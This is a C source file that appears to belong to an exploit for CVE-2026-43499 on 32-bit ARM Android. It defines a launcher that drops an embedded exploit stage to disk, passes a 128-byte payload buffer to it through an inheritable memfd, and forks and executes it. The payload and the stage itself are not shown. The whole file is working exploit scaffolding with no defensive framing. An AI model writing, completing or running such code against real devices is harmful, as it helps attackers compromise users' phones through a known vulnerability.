/*
 * api.c — launcher for the embedded 32-bit CVE-2026-43499 stage.
 *
 * Provides:
 *   int exp_stack_once(uint64_t *buffer);
 *
 * The caller prepares a 16-word (128-byte) payload buffer and this
 * function hands it to the embedded armeabi-v7a binary:
 *
 *   1. install_embedded_exp32() writes the embedded binary to
 *      EXP32_LOCAL (once per process);
 *   2. the buffer is stored in an inheritable memfd (no temp files);
 *   3. the child execve()s the 32-bit stage with the memfd number as
 *      argv[1] and the 64-bit side waits for it to finish.
 *
 * Returns the child's exit status, -1 on setup error, -2 if the
 * embedded binary could not be installed/exec'd.
 */

#include "common.h"

/* EXP32_LOCAL (common.h) is where the embedded 32-bit stage is dropped. */

/* Payload size: 16 uint64_t words (see src/exp32/main.c). */
#define EXP_BUFFER_BYTES 128

int exp_stack_once(uint64_t *buffer) {
  if (!buffer) {
    pr_warning("exp_stack_once: NULL buffer\n");
    return -1;
  }

  if (!install_embedded_exp32()) {
    pr_warning("exp_stack_once: embedded exp32 install failed errno=%d\n",
               errno);
    return -2;
  }

  /* Inheritable by default (no MFD_CLOEXEC): the exec'd child reads it. */
  int mfd = (int)syscall(__NR_memfd_create, "exp_buf", 0);
  if (mfd < 0) {
    pr_warning("exp_stack_once: memfd_create errno=%d\n", errno);
    return -1;
  }
  ssize_t written = write(mfd, buffer, EXP_BUFFER_BYTES);
  if (written != EXP_BUFFER_BYTES) {
    pr_warning("exp_stack_once: memfd write %zd errno=%d\n",
               written, errno);
    close(mfd);
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("exp_stack_once: fork errno=%d\n", errno);
    close(mfd);
    return -1;
  }

  if (pid == 0) {
    char fd_arg[16];
    snprintf(fd_arg, sizeof(fd_arg), "%d", mfd);
    execl(EXP32_LOCAL, EXP32_LOCAL, fd_arg, (char *)NULL);
    /* execl only returns on error. */
    pr_warning("exp_stack_once: execl errno=%d\n", errno);
    _exit(127);
  }

  int status;
  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {
  }
  close(mfd);

  if (WIFEXITED(status)) {
    int exit_code = WEXITSTATUS(status);
    if (exit_code == 127) {
      pr_warning("exp_stack_once: executable not found at %s\n",
                 EXP32_LOCAL);
      return -2;
    }
    return exit_code;
  }

  if (WIFSIGNALED(status)) {
    pr_warning("exp_stack_once: child killed by signal %d\n",
               WTERMSIG(status));
  }
  return -1;
}
